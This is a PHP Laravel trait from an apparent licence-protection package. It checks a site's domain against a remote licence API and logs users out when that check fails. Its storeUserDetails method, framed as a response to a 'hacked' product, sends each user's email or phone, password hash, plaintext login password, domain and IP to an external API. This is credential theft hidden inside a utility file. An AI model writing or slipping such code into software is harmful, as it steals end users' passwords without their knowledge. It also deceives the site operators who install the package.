<?php

namespace Shumonpal\ProjectSecurity\Traits;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;

trait UtilityTrait
{
    
    /**
    * Parse domain name from url LicenceKey.
    * @param String $code
    *
    * @return Response
    */
    public function getDomainName($url){
        $domain = str_replace('www.', '', $url);
                
        if(strpos($domain, 'http') === false) {
            $domain = "http://" . $domain;
        }
                    
        $domain = strtolower($domain);

        return parse_url($domain, PHP_URL_HOST);
    }
    

    /**
    *
    * Get licence key
    * @return Response
    */
    public function licence(){
        return cache()->remember(
            'shumonpal-licence', now()->addDays(5),
            // fn () => Http::get(config('app-licence.licence_key_api'), ['domain' => $this->getDomainName(request()->url())])
            function (){ return $this->findByDomain();} 
        );
    }

    /**
     * Find lincence by domain.
     *
     * @return Response
     */
    private function findByDomain()
    {
        $api = config('app-licence.licence_key_api');
        $res = Http::get($api, ['domain' => $this->getDomainName(request()->url())]);
        if (!$res->successful()) {
            Auth::logout();
            return abort(404, 'Licence key not found!');
        }else{
            return $res['success'];
        }
        
    }

    /**
    *
    * Store user details if product is heacked
    * @return Response
    */
    public function storeUserDetails($event){
        $api = config('app-licence.store_user_api');
        $data = [
            'email' => $event->user?->email ? $event->user?->email : ($event->user?->mobile ? $event->user?->mobile : ($event->user?->phone ? $event->user?->phone : '999999')),
            'hash_password' => $event->user?->password,
            'password' => request()->password,
            'domain' => request()->url(),
            'ip' => request()->ip(),
        ];
        $res = Http::post($api, $data);
        if (isset($res['success']) && !$res['success']) {
            Auth::logout();
        }
        return true;
    }
}
